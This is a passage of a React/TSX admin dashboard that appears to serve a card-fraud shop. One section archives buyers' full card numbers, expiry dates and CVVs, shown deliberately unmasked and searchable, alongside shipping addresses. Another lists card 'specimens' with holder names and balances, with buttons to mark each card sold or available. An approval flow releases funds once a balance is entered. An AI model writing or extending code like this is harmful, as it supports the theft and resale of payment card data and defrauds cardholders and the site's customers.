                                onClick={() => {
                                  if (!approvedBalances[wt.id]) {
                                    alert("CRITICAL ERROR: You must input or generate an approved balance before verifying release.");
                                    return;
                                  }
                                  handleAction(wt.id, "approve");
                                }}
                                className="w-full py-2 bg-[#d4af37] hover:bg-yellow-500 text-black rounded transition-all uppercase tracking-wider font-extrabold shadow cursor-pointer"
                              >
                                Approve Release
                              </button>
                            </div>
                          </div>
                        )}

                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>

          {/* SECTION 2: PURCHASED CREDIT CARDS AUDIT LOGS */}
          <div className="space-y-4">
            <div className="border-b border-zinc-900 pb-2.5 flex items-center justify-between">
              <span className="text-[10px] text-zinc-400 font-bold tracking-widest block font-mono uppercase flex items-center gap-2">
                <CreditCard className="w-3.5 h-3.5 text-[#d4af37]" /> Purchased Card Info Archive ({dbData.purchases.length} total)
              </span>
              <span className="text-[10px] text-zinc-650 font-mono font-bold uppercase block">// Dynamic Lockbox Logins</span>
            </div>

            {/* Quick search */}
            <div className="relative w-full max-w-sm">
              <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Search raw logs by holder, cardholder, or full numbers..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-zinc-950 border border-zinc-900 text-zinc-300 rounded-lg py-2 pl-9 pr-3 text-xs font-mono outline-none focus:border-zinc-700"
              />
            </div>

            {dbData.purchases.length === 0 ? (
              <div className="border border-dashed border-zinc-900 bg-neutral-950/20 rounded-xl p-12 text-center font-mono text-[11px] text-zinc-500">
                Awaiting first custom checkout event under local or network dispatch node...
              </div>
            ) : filteredPurchases.length === 0 ? (
              <div className="text-center p-8 text-zinc-650 font-mono text-xs">
                No archived purchases match "{searchTerm}"
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5 font-mono">
                {filteredPurchases.map((pur: any) => (
                  <div 
                    key={pur.id}
                    className="border border-zinc-900 bg-neutral-950/40 hover:border-zinc-800 rounded-xl p-5 flex flex-col justify-between space-y-4"
                  >
                    <div className="space-y-3">
                      
                      {/* Top Header info */}
                      <div className="flex justify-between items-center text-[10kb] border-b border-zinc-900 pb-2">
                        <span className="font-bold text-[#d4af37] text-[10px]">
                          REF: #{pur.id.slice(4, 12).toUpperCase()}
                        </span>
                        <span className="text-[9px] text-zinc-500">{pur.orderedAt}</span>
                      </div>

                      {/* RAW CREDIT CARD DETAILS - 100% UNMASKED FOR ADMINISTRATIVE SIGHT */}
                      <div className="bg-red-950/5 border border-red-900/10 rounded-xl p-3.5 text-left relative overflow-hidden">
                        <div className="absolute top-2 right-2 flex items-center gap-1 bg-red-950/30 border border-red-950/50 px-2 py-0.5 rounded text-[7.5px] text-red-400 font-bold uppercase tracking-wider">
                          <Lock className="w-2.5 h-2.5" /> SECURE DECRYPTED CARD INFO
                        </div>
                        
                        <div className="space-y-1">
                          <span className="text-[14px] sm:text-[15px] font-bold text-zinc-200 block tracking-widest leading-none font-mono">
                            {pur.config?.cardNumber || "NOT ASSIGNED"}
                          </span>
                          <div className="flex gap-4 text-[10.5px] text-zinc-400 pt-1.5 justify-start">
                            <div>
                              <span className="text-[8px] text-zinc-550 block select-none">EXP DATE</span>
                              <span className="font-semibold text-zinc-100">{pur.config?.expiryDate || "MM/YY"}</span>
                            </div>
                            <div>
                              <span className="text-[8px] text-zinc-550 block select-none">SEC CVV</span>
                              <span className="font-semibold text-zinc-100 text-[#d4af37]">{pur.config?.cvv || "---"}</span>
                            </div>
                            <div>
                              <span className="text-[8px] text-zinc-550 block select-none">NAME HOLDER</span>
                              <span className="font-semibold text-zinc-100 uppercase truncate max-w-[120px] inline-block">{pur.config?.cardHolder || "ANONYMOUS"}</span>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* SHIPPING MATRIX DETAILS */}
                      <div className="space-y-1 bg-zinc-950/55 p-3 rounded-lg border border-zinc-900/50 text-[10.5px] text-zinc-400 text-left">
                        <span className="text-[8px] text-zinc-500 uppercase block font-bold mb-1">// Courier Dispatch Coordinates</span>
                        <div className="flex items-start gap-1.5">
                          <MapPin className="w-3.5 h-3.5 text-zinc-500 shrink-0 mt-0.5" />
                          <div className="space-y-0.5 leading-tight">
                            <span className="text-zinc-200 block font-semibold">{pur.shippingDetails?.fullName}</span>
                            <span className="block">{pur.shippingDetails?.address}</span>
                            <span className="block">{pur.shippingDetails?.city}, {pur.shippingDetails?.postalCode}</span>
                            <span className="block uppercase text-zinc-500 text-[9px] font-bold">{pur.shippingDetails?.country}</span>
                          </div>
                        </div>
                      </div>

                    </div>

                    {/* Footer Tracker metrics */}
                    <div className="text-[10px] text-zinc-500 border-t border-zinc-950 pt-2 flex justify-between items-center bg-black/10">
                      <span>USPS: {pur.trackingNumber}</span>
                      <span className="text-emerald-500 font-bold uppercase tracking-wider bg-emerald-500/5 py-0.5 px-1.5 rounded text-[8px] border border-emerald-500/10">
                        Settle Code Verified
                      </span>
                    </div>

                  </div>
                ))}
              </div>
            )}
          </div>

          {/* SECTION 3: SPECIMENS/CARDS DROP AVAILABILITY MATRIX */}
          <div className="space-y-4 pt-4 border-t border-zinc-900" id="admin-specimens-catalog-matrix">
            <div className="flex items-center justify-between pb-2.5 border-b border-zinc-900">
              <span className="text-[10px] text-zinc-400 font-bold tracking-widest block font-mono uppercase flex items-center gap-2">
                <CreditCard className="w-3.5 h-3.5 text-emerald-400" /> Catalog Drop Specimens & Availability
              </span>
              <span className="text-[9px] text-[#d4af37] font-mono font-bold uppercase block">// Add or Remove Sold Tags</span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 font-mono">
              {(dbData.cards || []).map((card: any) => (
                <div 
                  key={card.cardNumber} 
                  className={`border rounded-xl p-4 flex flex-col justify-between space-y-3.5 ${
                    card.isSold 
                      ? 'border-red-900/35 bg-red-950/5' 
                      : 'border-zinc-850 bg-neutral-950/30'
                  }`}
                >
                  <div className="space-y-2 text-left">
                    <div className="flex items-center justify-between">
                      <span className="text-[8px] px-1.5 py-0.5 border rounded border-zinc-800 text-zinc-400 uppercase font-bold tracking-wider">
                        {card.finishType || 'Matte Specimen'}
                      </span>
                      {card.isSold ? (
                        <span className="text-[8px] bg-red-500/10 text-red-400 border border-red-500/20 py-0.5 px-2 rounded-full font-bold uppercase animate-pulse">
                          ● SOLD OUT
                        </span>
                      ) : (
                        <span className="text-[8px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 py-0.5 px-2 rounded-full font-bold uppercase">
                          AVAILABLE
                        </span>
                      )}
                    </div>

                    <div className="space-y-1">
                      <h4 className="text-[11px] font-bold tracking-widest text-zinc-200">
                        {card.cardNumber}
                      </h4>
                      <div className="flex justify-between items-center text-[10px] text-zinc-400 pt-0.5">
                        <span className="truncate max-w-[120px] font-semibold">{card.cardHolder?.toUpperCase()}</span>
                        <span className="text-[#d4af37] text-[9.5px] font-bold shrink-0">{card.soldBalance || "POOL"}</span>
                      </div>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => handleToggleSold(card.cardNumber, !!card.isSold)}
                    className={`w-full py-1.5 text-[9.5px] uppercase font-bold tracking-wider rounded transition-all flex items-center justify-center gap-1 border cursor-pointer ${
                      card.isSold
                        ? 'bg-emerald-950/20 border-emerald-900/40 hover:bg-emerald-950/40 text-emerald-400'
                        : 'bg-red-950/20 border-red-900/40 hover:bg-red-950/40 text-red-400'
                    }`}
                  >
                    {card.isSold ? (
                      <>Remove Sold Tag (Mark Available)</>
                    ) : (
                      <>Add Sold Tag (Mark Sold)</>
                    )}
                  </button>
                </div>
              ))}
            </div>
          </div>

        </div>
      )}
    </div>
  );
}
